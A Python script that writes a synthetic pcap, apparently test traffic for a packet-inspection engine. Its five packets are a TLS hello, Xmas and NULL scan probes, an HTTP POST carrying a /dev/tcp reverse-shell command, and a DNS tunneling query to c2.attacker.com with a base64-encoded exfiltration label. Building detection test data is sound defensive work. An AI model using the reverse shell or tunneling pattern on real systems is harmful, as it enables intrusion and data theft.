import struct
import time

def write_pcap(filename, packets):
    with open(filename, "wb") as f:
        # Global Header: magic, v2.4, thiszone, sigfigs, snaplen, network=1 (Ethernet)
        f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        now = int(time.time())
        for pkt in packets:
            f.write(struct.pack("<IIII", now, 0, len(pkt), len(pkt)))
            f.write(pkt)

def make_eth(src_mac, dst_mac, ethertype):
    src = bytes.fromhex(src_mac.replace(":", ""))
    dst = bytes.fromhex(dst_mac.replace(":", ""))
    return dst + src + struct.pack("!H", ethertype)

def make_ipv4(src_ip, dst_ip, proto, payload_len):
    src = bytes(map(int, src_ip.split(".")))
    dst = bytes(map(int, dst_ip.split(".")))
    total_len = 20 + payload_len
    # ver_ihl=0x45, dscp_ecn=0, total_len, id=1, flags_frag=0, ttl=64, proto, checksum=0
    hdr = struct.pack("!BBHHHBBH", 0x45, 0, total_len, 1, 0, 64, proto, 0) + src + dst
    return hdr

def make_tcp(src_port, dst_port, flags, payload):
    # offset=5 (20 bytes), flags, window=65535
    tcp_hdr = struct.pack("!HHIIBBHHH", src_port, dst_port, 1, 0, 0x50, flags, 65535, 0, 0)
    return tcp_hdr + payload

def make_udp(src_port, dst_port, payload):
    udp_hdr = struct.pack("!HHHH", src_port, dst_port, 8 + len(payload), 0)
    return udp_hdr + payload

packets = []

# 1. Normal TLS YouTube packet
eth = make_eth("00:11:22:33:44:55", "66:77:88:99:aa:bb", 0x0800)
tls_payload = b"\x16\x03\x03\x00\x30\x01\x00\x00\x2c\x03\x03" + (b"\x00"*32) + b"\x00\x00\x02\x00\x2f\x01\x00\x00\x0f\x00\x00\x00\x0b\x00\x09\x00\x00\x06youtube.com"
tcp = make_tcp(45120, 443, 0x18, tls_payload)
ip = make_ipv4("192.168.1.100", "172.217.14.206", 6, len(tcp))
packets.append(eth + ip + tcp)

# 2. Xmas Scan Probe (FIN + PSH + URG = 0x01 | 0x08 | 0x20 = 0x29)
tcp_xmas = make_tcp(55432, 22, 0x29, b"")
ip_xmas = make_ipv4("10.0.0.99", "192.168.1.1", 6, len(tcp_xmas))
packets.append(eth + ip_xmas + tcp_xmas)

# 3. NULL Scan Probe (flags = 0)
tcp_null = make_tcp(55433, 80, 0x00, b"")
ip_null = make_ipv4("10.0.0.99", "192.168.1.1", 6, len(tcp_null))
packets.append(eth + ip_null + tcp_null)

# 4. Malicious Shellcode / RCE injection payload
rce_payload = b"POST /api/vulnerable HTTP/1.1\r\nHost: target\r\n\r\n/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1\r\n"
tcp_rce = make_tcp(51234, 8080, 0x18, rce_payload)
ip_rce = make_ipv4("198.51.100.42", "192.168.1.10", 6, len(tcp_rce))
packets.append(eth + ip_rce + tcp_rce)

# 5. DNS Tunneling Query
dns_hdr = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
qname = b"\x2adGhpcy1pcy1hLXNlY3JldC1leGZpbHRyYXRpb24tcGF5bG9hZA\x02c2\x08attacker\x03com\x00"
dns_payload = dns_hdr + qname + struct.pack("!HH", 1, 1) # Type A, Class IN
udp = make_udp(53123, 53, dns_payload)
ip_dns = make_ipv4("192.168.1.150", "8.8.8.8", 17, len(udp))
packets.append(eth + ip_dns + udp)

write_pcap("/Users/ruprajdatta/openher/sentinel-dpi-engine/data/cyber_threat_matrix.pcap", packets)
print(f"Generated {len(packets)} cyber threat simulation packets in cyber_threat_matrix.pcap")
